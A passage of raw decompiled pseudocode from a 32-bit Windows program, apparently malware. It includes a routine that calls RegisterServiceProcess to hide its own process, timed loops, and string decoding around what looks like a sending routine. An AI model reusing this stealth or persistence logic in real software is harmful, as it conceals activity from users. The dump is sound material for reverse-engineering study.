  __int32 v29; // [esp+30h] [ebp-26Ch] BYREF
  int *v30; // [esp+34h] [ebp-268h] BYREF
  char *v31; // [esp+38h] [ebp-264h] BYREF
  int v32; // [esp+3Ch] [ebp-260h] BYREF
  char *v33; // [esp+40h] [ebp-25Ch] BYREF
  char *v34; // [esp+44h] [ebp-258h] BYREF
  volatile __int32 *v35; // [esp+48h] [ebp-254h] BYREF
  char *v36; // [esp+4Ch] [ebp-250h] BYREF
  __int32 v37; // [esp+50h] [ebp-24Ch] BYREF
  __int32 v38; // [esp+54h] [ebp-248h] BYREF
  __int32 v39; // [esp+58h] [ebp-244h] BYREF
  __int32 v40; // [esp+5Ch] [ebp-240h] BYREF
  __int32 v41; // [esp+60h] [ebp-23Ch] BYREF
  char v42[256]; // [esp+64h] [ebp-238h] BYREF
  __int32 v43; // [esp+164h] [ebp-138h] BYREF
  char *v44; // [esp+168h] [ebp-134h] BYREF
  __int32 v45; // [esp+16Ch] [ebp-130h] BYREF
  __int32 v46; // [esp+170h] [ebp-12Ch] BYREF
  char *v47; // [esp+174h] [ebp-128h] BYREF
  __int32 v48; // [esp+178h] [ebp-124h] BYREF
  __int32 v49; // [esp+17Ch] [ebp-120h] BYREF
  __int32 v50; // [esp+180h] [ebp-11Ch] BYREF
  char *v51; // [esp+184h] [ebp-118h] BYREF
  __int32 v52; // [esp+188h] [ebp-114h] BYREF
  __int32 v53; // [esp+18Ch] [ebp-110h] BYREF
  char *v54; // [esp+190h] [ebp-10Ch] BYREF
  __int32 v55; // [esp+194h] [ebp-108h] BYREF
  __int32 v56; // [esp+198h] [ebp-104h] BYREF
  __int32 v57; // [esp+19Ch] [ebp-100h] BYREF
  __int32 v58; // [esp+1A0h] [ebp-FCh] BYREF
  __int32 v59; // [esp+1A4h] [ebp-F8h] BYREF
  __int32 v60; // [esp+1A8h] [ebp-F4h] BYREF
  __int32 v61; // [esp+1ACh] [ebp-F0h] BYREF
  __int32 v62; // [esp+1B0h] [ebp-ECh] BYREF
  int *v63; // [esp+1B4h] [ebp-E8h] BYREF
  char v64[4]; // [esp+1B8h] [ebp-E4h] BYREF
  unsigned __int8 v65; // [esp+1BCh] [ebp-E0h] BYREF
  CHAR v66; // [esp+1BDh] [ebp-DFh]
  char v67[4]; // [esp+1C0h] [ebp-DCh] BYREF
  char v68[4]; // [esp+1C4h] [ebp-D8h] BYREF
  char **v69; // [esp+1C8h] [ebp-D4h] BYREF
  __int32 v70; // [esp+1CCh] [ebp-D0h] BYREF
  __int32 v71; // [esp+1D0h] [ebp-CCh] BYREF
  __int32 v72; // [esp+1D4h] [ebp-C8h] BYREF
  __int32 v73; // [esp+1D8h] [ebp-C4h] BYREF
  __int32 v74; // [esp+1DCh] [ebp-C0h] BYREF
  __int32 v75; // [esp+1E0h] [ebp-BCh] BYREF
  char *v76; // [esp+1E4h] [ebp-B8h] BYREF
  char *v77; // [esp+1E8h] [ebp-B4h] BYREF
  char *v78; // [esp+1ECh] [ebp-B0h] BYREF
  char *v79; // [esp+1F0h] [ebp-ACh] BYREF
  __int32 v80; // [esp+1F4h] [ebp-A8h] BYREF
  char *v81; // [esp+1F8h] [ebp-A4h] BYREF
  int v82; // [esp+1FCh] [ebp-A0h] BYREF
  CHAR szLang[21]; // [esp+203h] [ebp-99h] BYREF
  int v84; // [esp+218h] [ebp-84h]
  char *v85; // [esp+21Ch] [ebp-80h]
  char v86; // [esp+223h] [ebp-79h]
  _DWORD *v87; // [esp+224h] [ebp-78h]
  _DWORD *v88; // [esp+228h] [ebp-74h]
  char *i; // [esp+22Ch] [ebp-70h] BYREF
  int v90; // [esp+230h] [ebp-6Ch]
  int v91; // [esp+234h] [ebp-68h] BYREF
  char *v92; // [esp+238h] [ebp-64h] BYREF
  int v93; // [esp+23Ch] [ebp-60h]
  char *v94; // [esp+240h] [ebp-5Ch] BYREF
  char *v95; // [esp+244h] [ebp-58h] BYREF
  char *v96; // [esp+248h] [ebp-54h]
  char *v97; // [esp+24Ch] [ebp-50h]
  char *v98; // [esp+250h] [ebp-4Ch] BYREF
  int v99; // [esp+254h] [ebp-48h]
  volatile __int32 *v100; // [esp+258h] [ebp-44h] BYREF
  volatile __int32 *v101; // [esp+25Ch] [ebp-40h] BYREF
  volatile __int32 *v102; // [esp+260h] [ebp-3Ch] BYREF
  volatile __int32 *v103; // [esp+264h] [ebp-38h] BYREF
  __int32 v104; // [esp+268h] [ebp-34h] BYREF
  __int32 v105; // [esp+26Ch] [ebp-30h] BYREF
  char *v106; // [esp+270h] [ebp-2Ch] BYREF
  char *v107; // [esp+274h] [ebp-28h] BYREF
  char *v108; // [esp+278h] [ebp-24h] BYREF
  __int32 v109; // [esp+27Ch] [ebp-20h] BYREF
  __int32 v110; // [esp+280h] [ebp-1Ch] BYREF
  __int32 v111; // [esp+284h] [ebp-18h] BYREF
  __int32 v112; // [esp+288h] [ebp-14h] BYREF
  char *v113; // [esp+28Ch] [ebp-10h] BYREF
  char *v114; // [esp+290h] [ebp-Ch] BYREF
  volatile __int32 *v115; // [esp+294h] [ebp-8h] BYREF
  __int32 v116; // [esp+298h] [ebp-4h] BYREF
  int savedregs; // [esp+29Ch] [ebp+0h] BYREF

  v16 = &savedregs;
  v15 = &loc_41A017;
  ExceptionList = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  dword_41EF14 = (int)sub_402BAC(&off_40BBB4, 1);
  v88 = sub_402BAC(&off_40BBB4, 1);
  v87 = sub_402BAC(&off_40BBB4, 1);
  LOBYTE(v2) = 1;
  v90 = 0;
  sub_415FAC((int)dword_41A02C, 0, &v82);
  sub_40351C(&dword_41EEF4, v82);
  sub_415FAC((int)dword_41A064, 0, (volatile __int32 *)&v81);
  sub_415EAC(dword_41EEF4, v81, 0, &v116, 0, 0);
  if ( v116 )
  {
    sub_415FAC((int)dword_41A084, 0, &v80);
    sub_4037E4(&v116, 4);
    ExceptionList = 0;
    sub_415FAC((int)dword_41A0A4, 0, (volatile __int32 *)&v79);
    sub_415EAC(v116, v79, 0, (volatile __int32 *)&v115, 0, ExceptionList);
    ExceptionList = 0;
    sub_415FAC((int)dword_41A0C0, 0, (volatile __int32 *)&v78);
    sub_415EAC(v116, v78, 0, (volatile __int32 *)&v114, 0, ExceptionList);
    ExceptionList = 0;
    sub_415FAC((int)dword_41A0D4, 0, (volatile __int32 *)&v77);
    sub_415EAC(v116, v77, 0, (volatile __int32 *)&v113, 0, ExceptionList);
  }
  else
  {
    sub_415FAC((int)dword_41A0F0, 0, (volatile __int32 *)&v114);
    sub_41609C(5, &v76);
    v13 = (int)v76;
    v12 = dword_41A108;
    sub_4037E4((volatile __int32 *)&v115, 3);
    sub_41609C(5, &v113);
  }
  sub_415EAC(dword_41EEFC, "FB1BB", 0, &v105, 1, 0);
  sub_415EAC(dword_41EEFC, "FB1BC", 0, &v104, 1, 0);
  sub_4045A0((int *)&v101, (int)dword_419064, 1, 6);
  sub_40351C(v101 + 1, (__int32)v114);
  sub_415EAC(dword_41EEFC, "FB1BA", 0, &v75, 1, 0);
  sub_40351C(v101 + 2, v75);
  sub_415FAC((int)dword_41A144, 0, &v74);
  sub_40351C(v101 + 5, v74);
  sub_415FAC((int)dword_41A158, 0, &v73);
  sub_40351C(v101 + 4, v73);
  sub_415FAC((int)dword_41A16C, 0, &v72);
  sub_40351C(v101 + 3, v72);
  v93 = 1;
  v86 = 0;
  do
  {
    if ( sub_418FBC(v101[v93], a1, a2) )
    {
      v86 = 1;
      sub_403560((volatile __int32 *)&v114, v101[v93]);
      v93 = 5;
    }
    ++v93;
  }
  while ( v93 <= 5 );
  sub_415EAC(dword_41EEFC, (char *)dword_41A188, v114, &v71, 1, 1);
  if ( v86 )
    sub_403560((volatile __int32 *)&v106, (__int32)dword_41A194);
  else
    sub_403560((volatile __int32 *)&v106, (__int32)dword_41A1A0);
  sub_415EAC(dword_41EEFC, (char *)dword_41A1AC, v106, &v70, 1, 1);
  ExceptionList = 20;
  UserDefaultLangID = GetUserDefaultLangID();
  VerLanguageNameA(UserDefaultLangID, szLang, ExceptionList);
  sub_4045A0((int *)&v103, (int)dword_419064, 1, 5);
  v68[1] = szLang[0];
  v68[0] = 1;
  sub_402848(v67, v68);
  v66 = szLang[1];
  v65 = 1;
  sub_402818((unsigned __int8 *)v67, &v65, 2u);
  sub_402848(v64, v67);
  v66 = szLang[2];
  v65 = 1;
  sub_402818((unsigned __int8 *)v64, &v65, 3u);
  sub_4036EC((char **)&v69, v64);
  ExceptionList = (int)v69;
  sub_415FAC((int)dword_41A1B8, 0, (volatile __int32 *)&v63);
  sub_403834(ExceptionList, v63);
  if ( v4 )
  {
    sub_415FAC((int)dword_41A1C4, 0, &v112);
    sub_415FAC((int)dword_41A1E0, 0, &v111);
    sub_415FAC((int)dword_41A204, 0, &v62);
    sub_40351C(v103 + 1, v62);
    sub_415FAC((int)dword_41A244, 0, &v61);
    sub_40351C(v103 + 2, v61);
    sub_415FAC((int)dword_41A280, 0, &v60);
    sub_40351C(v103 + 3, v60);
    sub_415FAC((int)dword_41A2B4, 0, &v59);
    sub_40351C(v103 + 4, v59);
  }
  else
  {
    sub_415FAC((int)dword_41A2F4, 0, &v112);
    sub_415FAC((int)dword_41A310, 0, &v111);
    sub_415FAC((int)dword_41A330, 0, &v58);
    sub_40351C(v103 + 1, v58);
    sub_415FAC((int)dword_41A36C, 0, &v57);
    sub_40351C(v103 + 2, v57);
    sub_415FAC((int)dword_41A3A8, 0, &v56);
    sub_40351C(v103 + 3, v56);
    sub_415FAC((int)dword_41A3DC, 0, &v55);
    sub_40351C(v103 + 4, v55);
  }
  v5 = sub_4028F4(4u);
  sub_403560(&v110, v103[v5 + 1]);
  sub_4034C8(&v107);
  ExceptionList = 0;
  sub_415FAC((int)dword_41A41C, 0, (volatile __int32 *)&v54);
  v11 = v54;
  sub_403770(&v53, (char *)dword_41EEFC, "\\FA0");
  sub_415EAC(v53, v11, 0, &v109, 1, ExceptionList);
  v95 = (char *)sub_402978(v109, &v95);
  if ( v95 )
  {
    sub_415FAC((int)dword_41A438, 0, (volatile __int32 *)&v51);
    sub_403770(&v52, (char *)dword_41EEE8, v51);
    (*(void (**)(void))(*v88 + 88))();
    --v95;
  }
  else
  {
    sub_415EAC(dword_41EEFC, "FB1B", 0, (volatile __int32 *)&v107, 1, 0);
    sub_415EAC(dword_41EEFC, "FC43", (char *)dword_41A45C, &v50, 1, 1);
    sub_415EAC(dword_41EEFC, (char *)dword_41A478, 0, &v49, 1, 1);
    if ( !sub_4071A8(v107) )
      LOBYTE(v2) = 0;
  }
  ExceptionList = 1;
  sub_419074((volatile __int32 *)&v47);
  sub_415EAC(dword_41EEFC, "FD11", v47, &v48, 1, ExceptionList);
  if ( (_BYTE)v2 )
  {
    sub_4045A0((int *)&v100, (int)dword_419064, 1, 5);
    sub_40351C(v100 + 1, (__int32)dword_41A494);
    sub_40351C(v100 + 2, (__int32)dword_41A4A0);
    sub_40351C(v100 + 3, (__int32)dword_41A4AC);
    sub_40351C(v100 + 4, (__int32)dword_41A4B8);
    sub_4045A0((int *)&v102, (int)dword_419064, 1, 8);
    sub_40351C(v102 + 1, (__int32)dword_41A4C4);
    sub_40351C(v102 + 2, (__int32)dword_41A4C4);
    sub_40351C(v102 + 3, (__int32)dword_41A4C4);
    sub_40351C(v102 + 4, (__int32)dword_41A4D0);
    sub_40351C(v102 + 5, (__int32)dword_41A4DC);
    sub_40351C(v102 + 6, (__int32)dword_41A4E8);
    sub_40351C(v102 + 7, (__int32)dword_41A4F4);
    sub_4034C8(&v106);
    sub_415EAC(dword_41EEFC, "FC42", 0, &v46, 1, 0);
    v94 = (char *)sub_402978(v46, &v94);
    if ( !v94 || v94 == (char *)7 )
      v93 = 1;
    sub_415EAC(dword_41EEFC, "FC421", 0, &v45, 1, 0);
    for ( i = (char *)sub_402978(v45, &i); v93 <= 7; ++v93 )
    {
      sub_415FAC((int)dword_41A520, 0, (volatile __int32 *)&v44);
      sub_403770((volatile __int32 *)&v108, v44, (char *)v102[v93]);
      ExceptionList = 0;
      v13 = 1;
      v12 = &v109;
      sub_403770(&v43, (char *)dword_41EEFC, "\\FA0");
      sub_415EAC(v43, v108, 0, v12, v13, ExceptionList);
      v98 = (char *)sub_402978(v109, &v98);
      if ( v98 && (int)v98 > 0 )
      {
        v85 = v98;
        v99 = 1;
        do
        {
          (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 64))();
          sub_40296C(v99, v42);
          sub_4036EC((char **)&dword_41EEF4, v42);
          ExceptionList = dword_41EEE8;
          v13 = (int)dword_41A098;
          v12 = (volatile __int32 *)v108;
          sub_415FAC((int)"9luv", 0, &v40);
          sub_4037E4(&v41, 5);
          (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 88))();
          v97 = (char *)((*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))() - 1);
          if ( (int)v97 >= (int)i )
          {
            v84 = v97 - i + 1;
            v96 = i;
            do
            {
              sub_415EAC(dword_41EEFC, (char *)dword_41A548, (char *)dword_41A53C, &v39, 1, 1);
              if ( (unsigned __int8)sub_418EBC(v86, (unsigned __int8)v2) )
              {
                if ( !v106 || v90 == 8 )
                {
                  v90 = 0;
                  if ( v107
                    || (v6 = sub_4028F4((unsigned int)v95),
                        (*(void (__fastcall **)(__int32 *, int))(*v88 + 12))(&v38, v6),
                        sub_40351C(&dword_41EEF4, v38),
                        !sub_4071A8((char *)dword_41EEF4)) )
                  {
                    sub_403560((volatile __int32 *)&v106, (__int32)v107);
                  }
                  else
                  {
                    sub_4073EC((char *)dword_41EEF4, &v106);
                    sub_41620C((int)v106, &v36);
                    sub_415FAC((int)v36, 1, &v37);
                    sub_403834(v37, dword_41A554);
                    if ( !v4 )
                    {
                      ExceptionList = (int)v106;
                      v13 = (int)dword_41A560;
                      v7 = sub_4028F4(4u);
                      sub_415FAC(v100[v7 + 1], 0, (volatile __int32 *)&v35);
                      v12 = v35;
                      sub_4037E4((volatile __int32 *)&v106, 3);
                    }
                    ExceptionList = dword_41EEF0;
                    v13 = (int)dword_41A098;
                    v12 = (volatile __int32 *)v106;
                    sub_4037E4((volatile __int32 *)&v34, 3);
                    if ( !sub_4071A8(v34) )
                    {
                      ExceptionList = (int)v106;
                      v13 = (int)v114;
                      v12 = v115;
                      sub_403770((volatile __int32 *)&v33, (char *)dword_41EEF0, (char *)dword_41A098);
                      sub_4171C0((char *)dword_41EED8, (char *)dword_41EEF4, v33, 0, (int)v12, v13, ExceptionList);
                    }
                  }
                }
                dword_41EF1C = (int)sub_412560(dword_412544, 1);
                ExceptionList = (int)&savedregs;
                v13 = (int)&loc_419F4E;
                v12 = (volatile __int32 *)NtCurrentTeb()->NtTib.ExceptionList;
                __writefsdword(0, (unsigned int)&v12);
                sub_4037E4((volatile __int32 *)(dword_41EF1C + 12), 5);
                v8 = *(struct _EXCEPTION_REGISTRATION_RECORD **)dword_41EF14;
                (*(void (__fastcall **)(int *, char *))(*(_DWORD *)dword_41EF14 + 12))(&v32, v96);
                (*(void (**)(void))(**(_DWORD **)(dword_41EF1C + 16) + 52))();
                ExceptionList = (int)&dword_41EEF4;
                v9 = sub_4039B4(dword_41A560, v106);
                sub_40392C((int)v106, 1, (int)(v9 - 1), (char **)ExceptionList);
                sub_40351C((volatile __int32 *)(dword_41EF1C + 20), dword_41EEF4);
                (*(void (**)(void))(*v87 + 64))();
                (*(void (**)(void))(*v87 + 52))();
                (*(void (**)(void))(*v87 + 52))();
                (*(void (**)(void))(*v87 + 52))();
                (*(void (**)(void))(*v87 + 52))();
                (*(void (**)(void))(*v87 + 52))();
                sub_412620(dword_41EF1C, (int)v87);
                ExceptionList = dword_41EEF0;
                v13 = (int)dword_41A098;
                v12 = (volatile __int32 *)v106;
                sub_4037E4((volatile __int32 *)&v31, 3);
                sub_412708(dword_41EF1C, v31, (int)v8, a1, a2);
                sub_412844(dword_41EF1C, v8, a1, a2);
                sub_412A08(dword_41EF1C, a1);
                (*(void (__fastcall **)(int **, char *))(*(_DWORD *)dword_41EF14 + 12))(&v30, v96);
                sub_403834((int)v115, v30);
                if ( v4 )
                {
                  sub_415FAC((int)dword_41A59C, 0, &v29);
                  (*(void (__fastcall **)(__int32, char *))(*(_DWORD *)dword_41EF14 + 32))(v29, v96);
                }
                if ( !v96 && !v104 )
                {
                  (*(void (__fastcall **)(__int32, char *))(*(_DWORD *)dword_41EF14 + 32))(v105, v96);
                  sub_415EAC(dword_41EEFC, "FB1BC", (char *)dword_41A194, &v28, 1, 1);
                  sub_403560(&v104, (__int32)dword_41A194);
                }
                sub_415EAC(dword_41EEFC, (char *)dword_41A548, (char *)dword_41A5B8, &v27, 1, 1);
                ExceptionList = *(_DWORD *)(dword_41EF1C + 8);
                v2 = *(_DWORD *)dword_41EF14;
                (*(void (__fastcall **)(int *, char *))(*(_DWORD *)dword_41EF14 + 12))(&v26, v96);
                if ( sub_413258((int)v115, v26, (__int32)v114, v2, a1, a2, ExceptionList) )
                {
                  sub_415EAC(dword_41EEFC, (char *)dword_41A5C4, 0, &v25, 1, 0);
                  v92 = (char *)(sub_402978(v25, &v92) + 1);
                  sub_40296C((int)v92, v42);
                  sub_4036EC((char **)&dword_41EEF4, v42);
                  sub_415EAC(dword_41EEFC, (char *)dword_41A5C4, (char *)dword_41EEF4, &v24, 1, 1);
                  ++v90;
                  sub_415EAC(dword_41EEFC, (char *)dword_41A548, (char *)dword_41A5D0, &v23, 1, 1);
                  sub_415EAC(dword_41EEFC, "FD11", 0, &v22, 1, 0);
                  v91 = sub_402978(v22, (char **)&v91);
                  Sleep(60000 * v91);
                  ExceptionList = 1;
                  v13 = 1;
                  v12 = (volatile __int32 *)&v21;
                  v2 = *(_DWORD *)dword_41EF14;
                  (*(void (__fastcall **)(char **, char *))(*(_DWORD *)dword_41EF14 + 12))(&v20, v96);
                  sub_415EAC(dword_41EEFC, "FD10", v20, v12, v13, ExceptionList);
                  sub_40296C((int)v96, v42);
                  sub_4036EC((char **)&dword_41EEF4, v42);
                  sub_415EAC(dword_41EEFC, "FC421", (char *)dword_41EEF4, &v19, 1, 1);
                  if ( v96 == v97 )
                  {
                    sub_40351C(&dword_41EEF4, (__int32)dword_41A1A0);
                  }
                  else
                  {
                    sub_40296C(v93, v42);
                    sub_4036EC((char **)&dword_41EEF4, v42);
                  }
                  sub_415EAC(dword_41EEFC, "FC42", (char *)dword_41EEF4, &v18, 1, 1);
                }
                __writefsdword(0, (unsigned int)v15);
                v17 = &loc_419F55;
                sub_402BDC((_DWORD *)dword_41EF1C);
              }
              ++v96;
              --v84;
            }
            while ( v84 );
          }
          ++v99;
          --v85;
        }
        while ( v85 );
      }
      if ( (unsigned __int8)sub_418EBC(v86, (unsigned __int8)v2) )
      {
        if ( v93 == 7 )
          v93 = 1;
      }
      else
      {
        v93 = 7;
      }
    }
  }
  sub_402BDC((_DWORD *)dword_41EF14);
  sub_402BDC(v88);
  sub_402BDC(v87);
  __writefsdword(0, (unsigned int)v15);
  v17 = &loc_41A01E;
  sub_4034EC((int)&v18, 24);
  sub_4034EC((int)&v43, 21);
  sub_4034EC((int)&v69, 14);
  sub_403BE8((int *)&v100, (char *)dword_419064, 4);
  return sub_4034EC((int)&v104, 13);
}
// 4194E1: variable 'v4' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 412544: using guessed type int dword_412544[2];
// 419064: using guessed type int dword_419064[2];
// 41A02C: using guessed type int dword_41A02C[12];
// 41A064: using guessed type int dword_41A064[6];
// 41A084: using guessed type int dword_41A084[5];
// 41A098: using guessed type int dword_41A098[3];
// 41A0A4: using guessed type int dword_41A0A4[7];
// 41A0C0: using guessed type int dword_41A0C0[5];
// 41A0D4: using guessed type int dword_41A0D4[7];
// 41A0F0: using guessed type int dword_41A0F0[6];
// 41A108: using guessed type int dword_41A108[3];
// 41A144: using guessed type int dword_41A144[5];
// 41A158: using guessed type int dword_41A158[5];
// 41A16C: using guessed type int dword_41A16C[7];
// 41A188: using guessed type int dword_41A188[3];
// 41A194: using guessed type int dword_41A194[3];
// 41A1A0: using guessed type int dword_41A1A0[3];
// 41A1AC: using guessed type int dword_41A1AC[3];
// 41A1B8: using guessed type int dword_41A1B8[3];
// 41A1C4: using guessed type int dword_41A1C4[7];
// 41A1E0: using guessed type int dword_41A1E0[9];
// 41A204: using guessed type int dword_41A204[16];
// 41A244: using guessed type int dword_41A244[15];
// 41A280: using guessed type int dword_41A280[13];
// 41A2B4: using guessed type int dword_41A2B4[14];
// 41A2F4: using guessed type int dword_41A2F4[5];
// 41A310: using guessed type int dword_41A310[8];
// 41A330: using guessed type int dword_41A330[15];
// 41A36C: using guessed type int dword_41A36C[15];
// 41A3A8: using guessed type int dword_41A3A8[13];
// 41A3DC: using guessed type int dword_41A3DC[16];
// 41A41C: using guessed type int dword_41A41C[3];
// 41A438: using guessed type int dword_41A438[3];
// 41A45C: using guessed type int dword_41A45C[3];
// 41A478: using guessed type int dword_41A478[3];
// 41A494: using guessed type int dword_41A494[3];
// 41A4A0: using guessed type int dword_41A4A0[3];
// 41A4AC: using guessed type int dword_41A4AC[3];
// 41A4B8: using guessed type int dword_41A4B8[3];
// 41A4C4: using guessed type int dword_41A4C4[3];
// 41A4D0: using guessed type int dword_41A4D0[3];
// 41A4DC: using guessed type int dword_41A4DC[3];
// 41A4E8: using guessed type int dword_41A4E8[3];
// 41A4F4: using guessed type int dword_41A4F4[3];
// 41A520: using guessed type int dword_41A520[3];
// 41A53C: using guessed type int dword_41A53C[3];
// 41A548: using guessed type int dword_41A548[3];
// 41A554: using guessed type int dword_41A554[3];
// 41A560: using guessed type int dword_41A560[3];
// 41A59C: using guessed type int dword_41A59C[7];
// 41A5B8: using guessed type int dword_41A5B8[3];
// 41A5C4: using guessed type int dword_41A5C4[3];
// 41A5D0: using guessed type int dword_41A5D0[3];
// 41EED8: using guessed type int dword_41EED8;
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF14: using guessed type int dword_41EF14;
// 41EF1C: using guessed type int dword_41EF1C;
// 4190CC: using guessed type __int32 var_A0;
// 4190CC: using guessed type char var_D8[4];
// 4190CC: using guessed type char var_DC[4];
// 4190CC: using guessed type char var_E4[4];

//----- (0041A5E4) --------------------------------------------------------
int __usercall sub_41A5E4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v5; // [esp-4h] [ebp-20h]
  __int32 v6; // [esp+0h] [ebp-1Ch] BYREF
  __int32 v7; // [esp+4h] [ebp-18h] BYREF
  char *v8; // [esp+8h] [ebp-14h] BYREF
  __int32 v9; // [esp+Ch] [ebp-10h] BYREF
  __int32 v10; // [esp+10h] [ebp-Ch] BYREF
  __int32 v11; // [esp+14h] [ebp-8h] BYREF
  int v12; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7 = 0;
  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41A6FA;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_415EAC(dword_41EEFC, (char *)dword_41A710, 0, &v11, 1, 0);
  v12 = sub_402978(v11, (char **)&v12);
  if ( dword_41EF10 == 1 )
  {
    sub_415FAC((int)dword_41A71C, 0, &v10);
    sub_40351C(&dword_41EEF4, v10);
    sub_415FAC((int)dword_41A74C, 0, (volatile __int32 *)&v8);
    sub_415EAC(dword_41EEF4, v8, (char *)dword_41EEE4, &v9, 0, 1);
  }
  if ( v12 <= 0 && dword_41EF10 >= 2 )
  {
    sub_415EAC(dword_41EEFC, "FC43", 0, &v7, 1, 0);
    sub_417F24(v7, a2);
    sub_415EAC(dword_41EEFC, (char *)dword_41A710, (char *)&dword_41A778, &v6, 1, 1);
  }
  if ( v12 <= 1 && dword_41EF10 >= 2 && (unsigned __int8)sub_418EBC(1, a1) )
    sub_4190CC(a2, a3);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41A701;
  return sub_4034EC((int)&v6, 6);
}
// 41A710: using guessed type int dword_41A710[3];
// 41A71C: using guessed type int dword_41A71C[12];
// 41A74C: using guessed type int dword_41A74C[7];
// 41A778: using guessed type int dword_41A778;
// 41EEE4: using guessed type int dword_41EEE4;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF10: using guessed type int dword_41EF10;

//----- (0041A77C) --------------------------------------------------------
_DWORD *__usercall sub_41A77C@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41A7D1;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4034C8(&v7);
  if ( a1 > 0 )
  {
    do
    {
      sub_40372C(&v7, (__int32)&dword_41A7E8);
      --a1;
    }
    while ( a1 );
  }
  sub_40351C(a2, (__int32)v7);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41A7D8;
  return sub_4034C8(&v7);
}
// 41A7E8: using guessed type int dword_41A7E8;

//----- (0041A7EC) --------------------------------------------------------
int __thiscall sub_41A7EC(int (__stdcall *this)())
{
  int result; // eax
  DWORD CurrentProcessId; // eax
  FARPROC v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  LOBYTE(result) = sub_418E24("KERNEL32.DLL", "RegisterServiceProcess", &v3);
  if ( (_BYTE)result == 1 )
  {
    CurrentProcessId = GetCurrentProcessId();
    return ((int (__stdcall *)(DWORD, int))v3)(CurrentProcessId, 1);
  }
  return result;
}

//----- (0041A848) --------------------------------------------------------
int sub_41A848()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_41A8CB;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  sub_4034C8(&dword_41EEFC);
  sub_4034C8(&dword_41EEF8);
  sub_4034C8(&dword_41EEF4);
  sub_4034C8(&dword_41EEF0);
  sub_4034C8(&dword_41EEEC);
  sub_4034C8(&dword_41EEE8);
  sub_4034C8(&dword_41EEE4);
  sub_4034C8(&dword_41EEE0);
  sub_4034C8(&dword_41EEDC);
  sub_4034C8(&dword_41EED8);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41EED8: using guessed type int dword_41EED8;
// 41EEDC: using guessed type int dword_41EEDC;
// 41EEE0: using guessed type int dword_41EEE0;
// 41EEE4: using guessed type int dword_41EEE4;
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEEC: using guessed type int dword_41EEEC;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEF8: using guessed type int dword_41EEF8;
// 41EEFC: using guessed type int dword_41EEFC;

//----- (0041A9A4) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  HANDLE CurrentProcess; // eax
  HANDLE CurrentThread; // eax
  int (__stdcall *v3)(); // ecx
  int v4; // ebx
  char v5; // zf
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  unsigned __int64 v9; // st7
  __int64 v10; // rax
  int v11; // eax
  __int64 v12; // rax
  int v13; // [esp-4h] [ebp-23Ch]
  int v14; // [esp-4h] [ebp-23Ch]
  char *v15; // [esp-4h] [ebp-23Ch]
  int v16; // [esp+0h] [ebp-238h]
  char *v17; // [esp+0h] [ebp-238h]
  char *v18; // [esp+0h] [ebp-238h]
  __int64 v19; // [esp+0h] [ebp-238h]
  __int64 v20; // [esp+0h] [ebp-238h]
  char *v21; // [esp+4h] [ebp-234h]
  char *v22; // [esp+4h] [ebp-234h]
  int v23; // [esp+4h] [ebp-234h]
  char *v24; // [esp+4h] [ebp-234h]
  unsigned int v25[3]; // [esp+8h] [ebp-230h] BYREF
  unsigned int v26[2]; // [esp+14h] [ebp-224h] BYREF
  int *v27; // [esp+1Ch] [ebp-21Ch]
  __int32 v28; // [esp+2Ch] [ebp-20Ch] BYREF
  __int32 v29; // [esp+30h] [ebp-208h] BYREF
  char *v30; // [esp+34h] [ebp-204h] BYREF
  char *v31; // [esp+38h] [ebp-200h] BYREF
  char *v32; // [esp+3Ch] [ebp-1FCh] BYREF
  __int32 v33; // [esp+40h] [ebp-1F8h] BYREF
  __int32 v34; // [esp+44h] [ebp-1F4h] BYREF
  char *v35; // [esp+48h] [ebp-1F0h] BYREF
  char *v36; // [esp+4Ch] [ebp-1ECh] BYREF
  __int32 v37; // [esp+50h] [ebp-1E8h] BYREF
  char v38[4]; // [esp+54h] [ebp-1E4h] BYREF
  char v39[4]; // [esp+58h] [ebp-1E0h] BYREF
  unsigned __int8 v40; // [esp+5Ch] [ebp-1DCh] BYREF
  char v41; // [esp+5Dh] [ebp-1DBh]
  char v42[4]; // [esp+60h] [ebp-1D8h] BYREF
  char v43[4]; // [esp+64h] [ebp-1D4h] BYREF
  char *v44; // [esp+68h] [ebp-1D0h] BYREF
